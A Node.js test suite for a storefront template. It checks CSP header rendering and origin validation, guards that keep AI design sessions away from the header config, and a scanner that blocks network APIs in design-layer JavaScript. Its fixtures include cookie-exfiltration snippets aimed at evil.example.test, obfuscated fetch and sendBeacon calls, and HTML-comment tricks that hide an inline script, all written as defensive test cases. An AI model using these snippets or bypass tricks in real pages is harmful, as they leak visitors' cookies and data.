// D20 (hardening PR 4, v0.5.0 unreleased): the storefront CSP origins are the merchant's own (merchant.headers.json, human-owned), public/_headers is
// DERIVED from the core template + that file, the storefront scan refuses network APIs in the design layer, and the design layer cannot reach the
// core's private handle. Template-only.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, rmSync } from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { TEMPLATE, V1, V2, cleanup, node, git, read, write, makeMerchant, makeTemplateCopy, sync, snap } from './helpers.mjs';
import { createMerchant } from '../scripts/new-merchant.mjs';
import { validateConfig, renderHeaders, originProblem } from '../scripts/render-headers.mjs';
import { tmp } from './helpers.mjs';

after(cleanup);
const f = (p) => readFileSync(path.join(TEMPLATE, p), 'utf8').replace(/\r\n/g, '\n');
const layers = (d, ...a) => node(['scripts/check-layers.mjs', '--check', ...a], d);
const render = (d) => node(['scripts/render-headers.mjs'], d);
const cspOf = (text) => /^ {2}Content-Security-Policy: (.+)$/m.exec(text)[1];
const dirsOf = (csp) => Object.fromEntries(csp.split(';').map((p) => p.trim().split(/\s+/)).filter((a) => a[0]).map(([n, ...v]) => [n, v]));
const ORIGINS = { apiOrigin: 'https://api.shop.example.test', imageOrigin: 'https://img.shop.example.test' };
const merchant = (extra = {}) => makeMerchant({ apiBase: ORIGINS.apiOrigin, imageOrigin: ORIGINS.imageOrigin, ...extra });
const onCsp = (text, re, to) => text.replace(/^ {2}Content-Security-Policy:.*$/m, (l) => l.replace(re, to));
const setCfg = (d, patch) => write(d, 'merchant.headers.json', JSON.stringify({ ...JSON.parse(read(d, 'merchant.headers.json').replace(/^﻿/, '')), ...patch }, null, 2) + '\n');

// ───────────── the renderer ─────────────
test('render: connect-src is self + the API origin, img-src is self + data: + the image origin; no blanket https:, deterministic', () => {
  const core = f('scripts/headers.core.txt');
  const out = renderHeaders(core, ORIGINS);
  assert.equal(out, renderHeaders(core, { ...ORIGINS }), 'deterministic');
  const d = dirsOf(cspOf(out));
  assert.deepEqual(d['connect-src'], ["'self'", ORIGINS.apiOrigin]);
  assert.deepEqual(d['img-src'], ["'self'", 'data:', ORIGINS.imageOrigin]);
  assert.deepEqual(d['font-src'], ["'self'"]);
  assert.deepEqual(d['style-src'], ["'self'"]);
  assert.deepEqual(d['frame-src'], ["'none'"]);
  assert.deepEqual(d['script-src'], ["'self'"]);
  assert.deepEqual(d['frame-ancestors'], ["'none'"]);
  assert.deepEqual(d['form-action'], ["'self'", 'https://payment.ecpay.com.tw', 'https://payment-stage.ecpay.com.tw']);
  assert.doesNotMatch(cspOf(out), /\shttps:(\s|;|$)/);
  for (const h of ['X-Content-Type-Options', 'Referrer-Policy', 'X-Frame-Options', 'Strict-Transport-Security', 'Permissions-Policy', 'Cross-Origin-Opener-Policy']) assert.match(out, new RegExp(`^ {2}${h}:`, 'm'));
  assert.doesNotMatch(out, /\{\{/);
});

test('render: declared extras are added in order and de-duplicated; frame-src lists only declared frames', () => {
  const out = renderHeaders(f('scripts/headers.core.txt'), { ...ORIGINS, extraConnect: ['https://c1.example.test', ORIGINS.apiOrigin], extraImg: ['https://i1.example.test'], extraFont: ['https://fonts.example.test'], extraStyle: ['https://css.example.test'], extraFrame: ['https://pay.example.test'] });
  const d = dirsOf(cspOf(out));
  assert.deepEqual(d['connect-src'], ["'self'", ORIGINS.apiOrigin, 'https://c1.example.test']);
  assert.deepEqual(d['img-src'], ["'self'", 'data:', ORIGINS.imageOrigin, 'https://i1.example.test']);
  assert.deepEqual(d['font-src'], ["'self'", 'https://fonts.example.test']);
  assert.deepEqual(d['style-src'], ["'self'", 'https://css.example.test']);
  assert.deepEqual(d['frame-src'], ['https://pay.example.test']);
});

test('validate: only bare https origins; no scheme sources, wildcards, http, localhost, IPs, paths, userinfo, odd spelling; counts and keys are limited', () => {
  const bad = (cfg, re) => { const r = validateConfig(cfg); assert.ok(r.errors.length, JSON.stringify(cfg)); if (re) assert.match(r.errors.join('\n'), re); };
  assert.deepEqual(validateConfig(ORIGINS), { errors: [], placeholders: [] });
  for (const v of ['https:', '*', 'data:', 'https://*.example.test', 'http://api.example.test', 'http://localhost:8180', 'https://localhost', 'https://127.0.0.1', 'https://10.0.0.1:8443', 'https://api.example.test/',
    'https://api.example.test/v1', 'https://api.example.test?x=1', 'https://u:p@api.example.test', 'https://API.example.test', 'https://api.example.test:443', 'api.example.test', '', "https://a.example.test 'unsafe-inline'", 'https://a.example.test;script-src *', 'ws://a.example.test', 'wss://a.example.test', 'https://example']) {
    bad({ ...ORIGINS, apiOrigin: v });
    bad({ ...ORIGINS, extraConnect: [v] });
  }
  bad({ ...ORIGINS, extraConnect: Array.from({ length: 6 }, (_, i) => `https://c${i}.example.test`) }, /at most 5/);
  bad({ ...ORIGINS, extraFont: Array.from({ length: 4 }, (_, i) => `https://f${i}.example.test`) }, /at most 3/);
  bad({ ...ORIGINS, extraConnect: ['https://c.example.test', 'https://c.example.test'] }, /twice/);
  bad({ ...ORIGINS, extraScript: ['https://s.example.test'] }, /unknown key "extraScript"/);
  bad({ ...ORIGINS, extraConnect: 'https://c.example.test' }, /array/);
  bad({ imageOrigin: ORIGINS.imageOrigin }, /apiOrigin is required/);
  bad([], /JSON object/);
  assert.equal(originProblem('http://127.0.0.1:8180', { dev: true }), '');
  assert.notEqual(originProblem('http://example.test', { dev: true }), '');
  assert.throws(() => renderHeaders(f('scripts/headers.core.txt'), { ...ORIGINS, apiOrigin: 'https:' }));
});

test('render: a line over 2000 characters is an error; a legitimate maximal config fits; origins are limited to 100 characters, private suffixes are refused', () => {
  const core = f('scripts/headers.core.txt');
  const long = (i) => `https://${'a'.repeat(60)}.${String(i).padEnd(18, 'b')}.example.test`;
  assert.equal(long(1).length, 100, 'fixture length');
  const many = (n) => Array.from({ length: n }, (_, i) => long(i));
  const ok = renderHeaders(core, { ...ORIGINS, extraConnect: many(5), extraImg: many(5) });
  assert.ok(Math.max(...ok.split('\n').map((l) => l.length)) <= 2000, 'a full connect + img config fits');
  assert.throws(() => renderHeaders(core, { ...ORIGINS, extraConnect: many(5), extraImg: many(5), extraFont: many(3), extraStyle: many(3), extraFrame: many(3) }), /line \d+ is \d+ characters \(limit 2000/);
  const r = validateConfig({ ...ORIGINS, extraConnect: [long(1) + 'x'] });
  assert.match(r.errors.join(), /longer than 100 characters/);
  for (const h of ['x.local', 'x.example.localhost', 'api.internal', 'nas.lan', 'x.home.arpa', 'x.example.test.internal', 'localhost']) assert.ok(validateConfig({ ...ORIGINS, extraConnect: [`https://${h}`] }).errors.length, h);
  assert.deepEqual(validateConfig({ ...ORIGINS, extraConnect: ['https://xn--fiq228c.example.test'] }).errors, [], 'punycode hosts are accepted as written');
});

test('render: extraRules adds Cache-Control rules only (validated, at most 5), after the core block', () => {
  const core = f('scripts/headers.core.txt');
  const out = renderHeaders(core, { ...ORIGINS, extraRules: [{ path: '/assets/*', cacheControl: 'public, max-age=31536000, immutable' }] });
  assert.match(out, /\n\/assets\/\*\n {2}Cache-Control: public, max-age=31536000, immutable\n$/);
  assert.equal(out.indexOf('Content-Security-Policy'), renderHeaders(core, ORIGINS).indexOf('Content-Security-Policy'));
  const bad = (rules) => assert.ok(validateConfig({ ...ORIGINS, extraRules: rules }).errors.length, JSON.stringify(rules));
  bad([{ path: '/x', cacheControl: 'a', header: 'Set-Cookie' }]);
  bad([{ path: '/x' }]);
  bad([{ path: 'x', cacheControl: 'no-store' }]);
  bad([{ path: '/../x', cacheControl: 'no-store' }]);
  bad([{ path: '/x', cacheControl: 'a\nSet-Cookie: x' }]);
  bad([{ path: '/x', cacheControl: 'no-store' }, { path: '/x', cacheControl: 'no-cache' }]);
  bad(Array.from({ length: 6 }, (_, i) => ({ path: `/p${i}`, cacheControl: 'no-store' })));
  bad('x');
});

// ───────────── check-layers: public/_headers is derived ─────────────
test('check-layers (merchant): the rendered file passes; a stale or hand-edited _headers, an invalid or placeholder config, a missing config all fail', () => {
  const m = merchant(); const d = m.dir;
  assert.equal(layers(d).status, 0, layers(d).out);
  assert.match(read(d, 'public/_headers'), /connect-src 'self' https:\/\/api\.shop\.example\.test;/);
  const orig = read(d, 'public/_headers');
  // hand edit that stays a "valid" CSP: still byte-different from the rendering
  write(d, 'public/_headers', onCsp(orig, "font-src 'self';", "font-src 'self' https://fonts.example.test;"));
  let r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /not the rendering/);
  // an old-style https: blanket in a hand edit is also named
  write(d, 'public/_headers', onCsp(orig, /connect-src [^;]+;/, "connect-src 'self' https:;"));
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /connect-src must list explicit origins only/); assert.match(r.out, /not the rendering/);
  write(d, 'public/_headers', onCsp(orig, /img-src [^;]+;/, "img-src 'self' data: https:;"));
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /img-src must list explicit origins only/);
  write(d, 'public/_headers', orig);
  // a stale file after the config changed
  setCfg(d, { extraImg: ['https://more.example.test'] });
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /not the rendering/);
  assert.equal(render(d).status, 0);
  assert.equal(layers(d).status, 0, layers(d).out);
  // config values the renderer refuses
  for (const patch of [{ apiOrigin: 'https:' }, { extraConnect: ['*'] }, { extraConnect: ['https://*.example.test'] }, { imageOrigin: 'http://img.example.test' }, { extraConnect: ['data:'] }]) {
    const keep = read(d, 'merchant.headers.json');
    setCfg(d, patch);
    r = layers(d); assert.equal(r.status, 1, JSON.stringify(patch)); assert.match(r.out, /merchant\.headers\.json/);
    assert.notEqual(render(d).status, 0, 'the renderer refuses it too');
    write(d, 'merchant.headers.json', keep);
  }
  // placeholder: an ERROR in a merchant repo
  const keep = read(d, 'merchant.headers.json');
  setCfg(d, { imageOrigin: 'https://replace-with-image-origin.example.test' });
  assert.equal(render(d).status, 0);
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /still holds template placeholders/);
  r = layers(d, '--allow-placeholders'); assert.equal(r.status, 0, r.out); assert.match(r.out, /warning: merchant\.headers\.json still holds template placeholders/);
  write(d, 'merchant.headers.json', keep); render(d);
  // config.js apiBase must be allowed by the config
  write(d, 'public/config.js', read(d, 'public/config.js').replace('https://api.shop.example.test', 'https://other.example.test'));
  node(['scripts/check-layers.mjs', '--update'], d);
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /apiBase origin https:\/\/other\.example\.test is not allowed by merchant\.headers\.json/);
  git(d, 'checkout', '--', 'public/config.js'); node(['scripts/check-layers.mjs', '--update'], d);
  assert.equal(layers(d).status, 0);
  // missing config
  rmSync(path.join(d, 'merchant.headers.json'));
  r = layers(d); assert.equal(r.status, 1); assert.match(r.out, /merchant\.headers\.json is missing/);
  // an old manifest that still carries a hash of public/_headers is tolerated (it is verified by rendering now)
  git(d, 'checkout', '--', 'merchant.headers.json', 'public/_headers');
  const mf = JSON.parse(read(d, 'scripts/commerce.manifest.json')); mf['public/_headers'] = '0'.repeat(64);
  write(d, 'scripts/commerce.manifest.json', JSON.stringify(mf, null, 2) + '\n');
  assert.equal(layers(d).status, 0, layers(d).out);
});

test('check-layers (merchant): a config saved with a UTF-8 BOM is accepted; extraRules render and pass', () => {
  const m = merchant(); const d = m.dir;
  write(d, 'merchant.headers.json', '\uFEFF' + read(d, 'merchant.headers.json'));
  assert.equal(render(d).status, 0);
  assert.equal(layers(d).status, 0, layers(d).out);
  setCfg(d, { extraRules: [{ path: '/assets/*', cacheControl: 'public, max-age=86400' }] });
  assert.equal(layers(d).status, 1, 'stale until rendered');
  assert.equal(render(d).status, 0);
  assert.match(read(d, 'public/_headers'), /\/assets\/\*\n {2}Cache-Control: public, max-age=86400/);
  assert.equal(layers(d).status, 0, layers(d).out);
  rmSync(path.join(d, 'merchant.headers.json'));
  const r = layers(d);
  assert.equal(r.status, 1); assert.match(r.out, /merchant\.headers\.json is missing/); assert.match(r.out, /render-headers\.mjs --root \. --core/); assert.match(r.out, /MIGRATION/);
});

test('check-layers (template): leftover placeholders are a WARNING, and the committed template renders exactly', () => {
  const r = layers(TEMPLATE);
  assert.equal(r.status, 0, r.out);
  assert.match(r.out, /warning: merchant\.headers\.json still holds template placeholders/);
  assert.equal(node(['scripts/render-headers.mjs', '--check'], TEMPLATE).status, 0);
  const tj = JSON.parse(f('template.json'));
  assert.ok(!tj.lockedPaths.includes('public/_headers'));
  for (const p of ['public/_headers', 'merchant.headers.json']) assert.ok(tj.merchantOwnedPaths.includes(p), p);
  for (const p of ['scripts/render-headers.mjs', 'scripts/headers.core.txt']) assert.ok(tj.lockedPaths.includes(p), p);
  assert.ok(!('public/_headers' in JSON.parse(f('scripts/commerce.manifest.json'))), 'derived, verified by rendering, not hashed');
});

// ───────────── the AI scope cannot touch the config or the rendering ─────────────
test('check-scope and check-locked: merchant.headers.json, public/_headers, the core template and the renderer are out of scope for storefront AND admin sessions', () => {
  const m = merchant(); const d = m.dir;
  const base = git(d, 'rev-parse', 'HEAD').out.trim();
  git(d, 'switch', '-c', 'design/storefront-origins');
  for (const file of ['merchant.headers.json', 'public/_headers', 'scripts/headers.core.txt', 'scripts/render-headers.mjs']) {
    git(d, 'checkout', '-q', '.');
    write(d, file, read(d, file) + (file.endsWith('.json') ? ' ' : '\n'));
    for (const site of ['storefront', 'admin']) {
      const s = node(['scripts/check-scope.mjs', site, '--base', base], d);
      assert.equal(s.status, 1, `${site} ${file}: ${s.out}`);
      assert.ok(s.out.includes(file));
    }
    git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'x');
    const l = node(['scripts/check-locked.mjs', '--base', base, '--head', 'HEAD'], d);
    assert.equal(l.status, 1, `${file}: ${l.out}`); assert.ok(l.out.includes(file));
    git(d, 'reset', '-q', '--hard', base);
  }
  // even when a (hostile) template.json lists the file as a design path, the scope check refuses it
  const tj = JSON.parse(read(d, 'template.json')); tj.sites.storefront.designPaths.push('merchant.headers.json', 'public/_headers');
  write(d, 'template.json', JSON.stringify(tj, null, 2));
  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'widen');
  const base2 = git(d, 'rev-parse', 'HEAD').out.trim();
  setCfg(d, { extraConnect: ['https://evil.example.test'] });
  const s = node(['scripts/check-scope.mjs', 'storefront', '--base', base2], d);
  assert.equal(s.status, 1, s.out); assert.ok(s.out.includes('merchant.headers.json'));
});

// ───────────── sync-core preserves the merchant's values and re-renders ─────────────
const withCoreHeader = (dir) => {
  write(dir, 'scripts/headers.core.txt', read(dir, 'scripts/headers.core.txt').replace('  X-Frame-Options: DENY', '  X-Frame-Options: DENY\n  X-Permitted-Cross-Domain-Policies: none'));
  const r = render(dir); if (r.status !== 0) throw new Error(r.out);
};
test('sync-core: the merchant\'s origins survive, public/_headers is re-rendered from the NEW core template (never the template\'s own placeholder copy)', () => {
  const m = merchant(); const d = m.dir;
  setCfg(d, { extraConnect: ['https://extra.shop.example.test'], extraImg: ['https://extra-img.shop.example.test'] });
  render(d); node(['scripts/check-layers.mjs', '--update'], d); git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'extras');
  const cfgBefore = read(d, 'merchant.headers.json');
  const tpl = makeTemplateCopy(V2, withCoreHeader);
  assert.match(read(tpl, 'public/_headers'), /replace-with-api-origin/, 'the template copy carries placeholders');
  let r = sync(d, tpl, '--dry-run');
  assert.equal(r.status, 0, r.out); assert.match(r.out, /public\/_headers: would be re-rendered from the core template \+ merchant\.headers\.json \(no manual edits found/);
  assert.equal(read(d, 'merchant.headers.json'), cfgBefore);
  r = sync(d, tpl, '--yes');
  assert.equal(r.status, 0, r.out); assert.match(r.out, /re-rendered: public\/_headers/);
  assert.equal(read(d, 'merchant.headers.json'), cfgBefore, 'a sync never touches the merchant config');
  const h = read(d, 'public/_headers');
  assert.match(h, /X-Permitted-Cross-Domain-Policies: none/, 'the new core header arrived');
  const dirs = dirsOf(cspOf(h));
  assert.deepEqual(dirs['connect-src'], ["'self'", ORIGINS.apiOrigin, 'https://extra.shop.example.test']);
  assert.deepEqual(dirs['img-src'], ["'self'", 'data:', ORIGINS.imageOrigin, 'https://extra-img.shop.example.test']);
  assert.doesNotMatch(h, /replace-with/);
  assert.equal(read(d, 'scripts/headers.core.txt'), read(tpl, 'scripts/headers.core.txt'));
  assert.ok(!('public/_headers' in JSON.parse(read(d, 'scripts/commerce.manifest.json'))));
  assert.equal(layers(d).status, 0, layers(d).out);
});

test('sync-core: a hand-edited public/_headers is reported loudly (dry run and apply) before it is re-rendered; extraRules is the legitimate way', () => {
  const m = merchant(); const d = m.dir;
  write(d, 'public/_headers', read(d, 'public/_headers') + '\n/assets/*\n  Cache-Control: public, max-age=31536000\n');
  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'hand edit');
  const tpl = makeTemplateCopy(V2, withCoreHeader);
  let r = sync(d, tpl, '--dry-run');
  assert.equal(r.status, 0, r.out);
  assert.match(r.out, /public\/_headers HAS MANUAL EDITS\. This sync would re-render public\/_headers from the core template \+ merchant\.headers\.json; the manual edits would be LOST/);
  assert.match(r.out, /\+?\s*-? ?\(in the file, not in the rendering\) \/assets\/\*/);
  assert.match(r.out, /extraRules/);
  assert.match(read(d, 'public/_headers'), /\/assets\/\*/, 'a dry run changes nothing');
  r = sync(d, tpl, '--yes');
  assert.equal(r.status, 0, r.out);
  assert.match(r.out, /MANUAL EDITS\. This sync will re-render/);
  assert.doesNotMatch(read(d, 'public/_headers'), /\/assets\/\*/);
  assert.equal(layers(d).status, 0);
});

test('sync-core: refused without merchant.headers.json (migration text); an invalid config is refused (also by --dry-run) and changes nothing', () => {
  const m = merchant(); const d = m.dir;
  const tpl = makeTemplateCopy(V2, withCoreHeader);
  git(d, 'rm', '-q', 'merchant.headers.json'); git(d, 'commit', '-q', '-m', 'drop');
  let r = sync(d, tpl, '--yes');
  assert.equal(r.status, 2, r.out); assert.match(r.out, /merchant\.headers\.json is missing/); assert.match(r.out, /render-headers\.mjs --root \./);
  git(d, 'revert', '--no-edit', 'HEAD');
  setCfg(d, { apiOrigin: 'https:' });
  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'bad cfg');
  const before = snap(d, ['public/_headers', 'scripts/headers.core.txt', 'template.json', '.template-version']);
  r = sync(d, tpl, '--dry-run');
  assert.equal(r.status, 2, r.out); assert.match(r.out, /merchant\.headers\.json is invalid/); assert.match(r.out, /apiOrigin/);
  r = sync(d, tpl, '--yes');
  assert.equal(r.status, 2, r.out); assert.match(r.out, /merchant\.headers\.json is invalid/);
  assert.deepEqual(snap(d, Object.keys(before)), before, 'nothing changed');
  assert.equal(git(d, 'status', '--porcelain', '--untracked-files=all').out.trim(), '');
});

test('sync-core migration: a v0.4-style merchant (hash of public/_headers in its manifest, no config) takes the documented path', () => {
  const m = merchant(); const d = m.dir;
  // pre-migration state: the config does not exist yet, _headers is the old blanket file and the manifest hashes it
  const cfg = read(d, 'merchant.headers.json');
  git(d, 'rm', '-q', 'merchant.headers.json');
  write(d, 'public/_headers', read(d, 'public/_headers').replace(/connect-src [^;]+;/, "connect-src 'self' https:;"));
  const mf = JSON.parse(read(d, 'scripts/commerce.manifest.json')); mf['public/_headers'] = 'a'.repeat(64);
  write(d, 'scripts/commerce.manifest.json', JSON.stringify(mf, null, 2) + '\n');
  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'v0.4 state');
  const tpl = makeTemplateCopy(V2);
  assert.equal(sync(d, tpl, '--yes').status, 2);
  write(d, 'merchant.headers.json', cfg);
  const r0 = node(['scripts/render-headers.mjs', '--root', '.', '--core', path.join(tpl, 'scripts/headers.core.txt')], d);
  assert.equal(r0.status, 0, r0.out);
  git(d, 'add', '-A'); git(d, 'commit', '-q', '-m', 'migrate');
  const r = sync(d, tpl, '--yes');
  assert.equal(r.status, 0, r.out);
  assert.ok(!('public/_headers' in JSON.parse(read(d, 'scripts/commerce.manifest.json'))));
  assert.equal(layers(d).status, 0);
});

// ───────────── new-merchant ─────────────
test('new-merchant: --api-base and --image-origin fill merchant.headers.json and the rendered _headers; a missing image origin leaves a placeholder that the guard reports as an ERROR', () => {
  const m = merchant(); const d = m.dir;
  const cfg = JSON.parse(read(d, 'merchant.headers.json'));
  assert.equal(cfg.apiOrigin, ORIGINS.apiOrigin); assert.equal(cfg.imageOrigin, ORIGINS.imageOrigin);
  assert.doesNotMatch(read(d, 'public/_headers') + read(d, 'merchant.headers.json'), /replace-with-(api|image)-origin/);
  assert.equal(layers(d).status, 0);
  assert.equal(m.hasOrigins, true);
  const p = makeMerchant({ apiBase: ORIGINS.apiOrigin, imageOrigin: undefined });
  assert.equal(p.hasOrigins, false);
  assert.match(read(p.dir, 'merchant.headers.json'), /replace-with-image-origin/);
  const r = layers(p.dir);
  assert.equal(r.status, 1, r.out); assert.match(r.out, /still holds template placeholders/);
  assert.equal(layers(p.dir, '--allow-placeholders').status, 0);
  assert.doesNotMatch(cspOf(read(p.dir, 'public/_headers')), /\shttps:(\s|;|$)/);
  const t = path.join(tmp(), 'x');
  assert.throws(() => createMerchant({ target: t, name: 'X', slug: 'ok-slug', apiBase: ORIGINS.apiOrigin, imageOrigin: 'http://img.example.test' }), /https/);
  assert.throws(() => createMerchant({ target: path.join(tmp(), 'y'), name: 'X', slug: 'ok-slug', apiBase: 'https://127.0.0.1:8180' }), /--api-base .* Content-Security-Policy/);
  assert.match(read(d, 'README.md'), /merchant\.headers\.json/);
});

// ───────────── the storefront network scan ─────────────
const scanMerchant = () => merchant().dir;
const withApp = (d, snippet) => { const orig = read(d, 'public/app.js'); write(d, 'public/app.js', orig + '\n' + snippet + '\n'); const r = layers(d); write(d, 'public/app.js', orig); return r; };

test('storefront scan (D20): network APIs are refused as identifiers, aliases, computed names and element tricks', () => {
  const d = scanMerchant();
  const bad = [
    ["(0, fetch)('https://evil.example.test/x');", /fetch/],
    ["var f = fetch; f('/x');", /fetch/],
    ["var g = window.fetch;", /fetch/],
    ["const { fetch: f } = window;", /fetch/],
    ["window['fe' + 'tch']('/x');", /"fetch"/],
    ["window[\"fe\" + 'tc' + `h`]('/x');", /"fetch"/],
    ["globalThis['\\x66etch']('/x');", /"fetch"/],
    ["Reflect.get(window, 'fetch');", /"fetch"/],
    ["navigator.sendBeacon('https://evil.example.test', 'x');", /sendBeacon/],
    ["navigator['send' + 'Beacon']('https://evil.example.test', 'x');", /"sendBeacon"/],
    ["var w = new WebSocket('wss://evil.example.test');", /WebSocket/],
    ["var s = new EventSource('https://evil.example.test');", /EventSource/],
    ["var x = new XMLHttpRequest();", /XMLHttpRequest/],
    ["var X = window['XMLHttp' + 'Request'];", /"XMLHttpRequest"/],
    ["new Image().src = 'https://evil.example.test/p.gif?d=' + document.cookie;", /new Image/],
    ["new Audio('https://evil.example.test/a.mp3');", /new Image \/ Audio/],
    ["new Worker('w.js');", /new Image \/ Audio \/ Worker/],
    ["var p = new RTCPeerConnection();", /RTCPeerConnection/],
    ["window.open('https://evil.example.test');", /window\.open/],
    ["import('https://evil.example.test/x.js');", /dynamic import/],
    ["var m = import.meta;", /dynamic import/],
    ["var q = \\u0066etch;", /fetch/],
    ["var o = self.fetch;", /self\.fetch/],
    ["globalThis.fetch('/x');", /globalThis\.fetch/],
    ["window.fetch('/x');", /window\.fetch/],
    ["(window).fetch('/x');", /window\.fetch/],
    ["window?.fetch?.('/x');", /window\.fetch/],
    ["top.sendBeacon('/x');", /top\.sendBeacon/],
    ["const { fetch: f } = window;", /taken from window/],
    ["const { fetch } = globalThis;", /taken from globalThis/],
    ["const { \"fetch\": f } = self;", /taken from self/],
    ["var h = { fetch };", /fetch/],
    ["call(a, fetch);", /fetch/],
    ["window.WebSocket;", /window\.WebSocket/],
    ["window?.open('https://evil.example.test');", /window\.open/],
    ["(window).open('https://evil.example.test');", /window\.open/],
    ["self.open('x');", /window\.open/],
    ["new window.Image().src = 'https://evil.example.test/p';", /new Image/],
    ["new (window).Audio();", /new Image/],
    ["const w = window;", /aliasing a global object/],
    ["var g; g = globalThis;", /aliasing a global object/],
    ["let s = (self);", /aliasing a global object/],
    ["location.href = 'https://evil.example.test/?d=' + document.cookie;", /navigation/],
    ["location = 'https://evil.example.test';", /navigation/],
    ["document.location = url;", /navigation/],
    ["window.location.assign('https://evil.example.test');", /navigation/],
    ["location.replace(next);", /navigation/],
    ["location.href = '#/ok' + '/x' + other + 'https://evil.example.test';", /navigation/],
    ["const t = top;", /aliasing a global object/],
    ["const p = (parent);", /aliasing a global object/],
    ["var a = {}; a.ping = 'http://x.example.test';", /ping/],
    ["el.ping = url;", /ping/],
    ["var s = document.createElement('script');", /createElement/],
    ["var s = document.createElement(\"iframe\");", /createElement/],
    ["var s = document.createElement('link');", /createElement/],
    ["var s = document.createElement('meta');", /createElement/],
    ["var t = '<a href=\"/x\" ping=\"https://evil.example.test\">x</a>';", /ping/],
    ["a.ping = 'https://evil.example.test';", /ping/],
    ["a.setAttribute('ping', 'https://evil.example.test');", /ping/],
    ["navigator.serviceWorker.register('/sw.js');", /serviceWorker/],
    ["navigator?.serviceWorker;", /serviceWorker/],
    ["navigator['serviceWorker'];", /serviceWorker/]
  ];
  for (const [code, re] of bad) {
    const r = withApp(d, code);
    assert.equal(r.status, 1, code + '\n' + r.out);
    assert.match(r.out, /storefront network scan|forbidden in design layer/, code);
    assert.match(r.out, re, code);
  }
  assert.equal(layers(d).status, 0, 'the untouched design layer passes');
});

test('storefront scan (D20, D23): a bare open(...) is window.open unless the file declares a real FUNCTION open or the call is a method definition; a variable, parameter or arrow named open no longer exempts the file', () => {
  const d = scanMerchant();
  const orig = read(d, 'public/content.js');
  const run = (code) => { write(d, 'public/content.js', orig + '\n' + code + '\n'); const r = layers(d); write(d, 'public/content.js', orig); return r; };
  const bad = [
    "open('x');", "if (go) { open(\"https://evil.example.test\"); }", "open('a', '_blank');",
    // the old bypass: ANY declaration of a binding named open exempted the whole file
    "const open = window['op' + 'en']; open('https://evil.example.test');",
    "var open = pick(); open('https://evil.example.test');",
    "let open; open = pick(); open('https://evil.example.test');",
    "function wrap(open) { return open('https://evil.example.test'); }",
    "const open = (x) => x; open(2);",
    "const f = (open) => open('https://evil.example.test');",
    "const { open } = api; open('https://evil.example.test');",
    "var o = { open: 1 }; var open = o.x; open('https://evil.example.test');"
  ];
  for (const code of bad) { const r = run(code); assert.equal(r.status, 1, code + r.out); assert.match(r.out, /bare open|window\.open|destructuring|computed access/, code + r.out); }
  for (const code of ["function open(x) { return x; } open(1);", "async function open(x) { return x; } open(1);", "var drawer = { open() { return 1; } };", "class M { open() { return 1; } static open() { return 2; } }", "var o = { async open() { return 1; }, get open2() { return 1; } };"]) { const r = run(code); assert.equal(r.status, 0, code + r.out); }
});

test('storefront scan (D23): destructuring or aliasing open / location / history out of window, globalThis, self, top or parent, and bracket access with the exact string, are refused', () => {
  const d = scanMerchant();
  const bad = [
    "const { open } = window; open('https://evil.example.test');",
    "var { open: o } = window;",
    "let open2; ({ open: open2 } = globalThis);",
    "const { open: o, ...rest } = self;",
    "const { location } = window;",
    "const { location: { href } } = window;",
    "const { history } = top;",
    "const { ['op' + 'en']: o } = window;",
    "const { [k]: o } = window;",
    "const { ...everything } = window;",
    "const { open } = (window);",
    "const o = window['op' + 'en'];",
    "const o = window[\"open\"];",
    "const o = self?.['open'];",
    "const o = globalThis['locat' + 'ion'];",
    "const h = top['history'];",
    "const o = Reflect.get(window, 'open');",
    "const l = window.location; l.href = 'https://evil.example.test';",
    "const l = location; l.assign('https://evil.example.test');",
    "var h = history;",
    "var h = window.history;",
    "var l = document.location;",
    "const l = (window).location;"
  ];
  for (const code of bad) { const r = withApp(d, code); assert.equal(r.status, 1, code + '\n' + r.out); assert.match(r.out, /destructuring|aliasing|computed access|window\.open|bare open/, code + r.out); }
  const good = [
    "location.hash = '#/shop'; var h = location.hash; if (location.hash === '#/x') { h = 1; }",
    "var u = window.location.href.replace(/x/, 'y'); var p = window.location.pathname;",
    "history.replaceState(null, '', '#/x'); window.history.pushState(null, '', '#/y'); var n = history.length;",
    "var { hash, search } = location; var { pathname } = window.location;",
    "const { innerWidth, innerHeight } = window; const { scrollY } = self;",
    "const { open } = menuState; var { location } = shop; const { history } = shop.data;",
    "const { top, parent } = layout; const t2 = top;",
    "var o = { open: 1, location: 2, history: 3 }; o.open = 4; var l = o.location; var hh = o['history'];",
    "var state = { location: 'x' }; var loc = state.location; var hist = state.history;",
    "var location2 = 1, history2 = 2, openState = 3; var r = history2;",
    "function f(location) { var l = location; return l; } var history = []; var hh = history;",
    "var w = window.innerWidth, hs = window.history.length > 1;"
  ];
  for (const code of good) { const r = withApp(d, code); assert.equal(r.status, 0, code + '\n' + r.out); }
  assert.equal(layers(TEMPLATE).status, 0, 'the real template design files pass');
});

test('storefront scan (D23): an index.html HTML comment that ends with --!> or is the empty <!--> does not hide an inline script', () => {
  const d = scanMerchant();
  const idx = read(d, 'public/index.html');
  const withBody = (extra) => { write(d, 'public/index.html', idx.replace('</body>', extra + '\n</body>')); const r = layers(d); write(d, 'public/index.html', idx); return r; };
  assert.equal(layers(d).status, 0);
  // (in a merchant repo the inline script is a WARNING, in the template an error; the message is what shows the script was seen) a comment ended by --!> and a later --> : the browser runs the script, the old regex hid it
  for (const extra of ['<!-- x --!><script>alert(1)</script><!-- y -->', '<!--> <script>alert(1)</script> -->', '<!---> <script>alert(1)</script> -->', '<!-- a --!> <script>alert(1)</script>', '<script>alert(1)']) {
    const r = withBody(extra); assert.match(r.out, /inline <script>/, extra + r.out);
  }
  for (const extra of ['<!-- <script>alert(1)</script> -->', '<!-- <script>alert(1)</script> --!>', '<!-- plain -->']) { const r = withBody(extra); assert.equal(r.status, 0, extra + r.out); assert.doesNotMatch(r.out, /inline <script>/, extra); }
});

